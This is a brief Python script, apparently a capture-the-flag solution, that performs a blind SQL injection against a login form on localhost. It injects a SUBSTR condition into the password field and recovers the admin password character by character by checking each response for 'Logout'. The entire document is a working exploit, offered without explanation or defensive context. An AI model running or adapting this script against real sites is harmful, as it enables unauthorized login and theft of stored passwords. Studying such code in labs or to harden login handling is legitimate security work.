import requests

FLAG = ""
while True:
    for i in range(20, 127):
        payload = {
            "username": "admin",
            "password": "' OR SUBSTR(password, " + str(len(FLAG) + 1) + ", 1) = '" + chr(i),
            "login": "Login"
        }
        r = requests.post("http://localhost:8000/login.php", data=payload)
        if 'Logout' in r.content:
            FLAG = FLAG + chr(i)
            print(FLAG)
            break
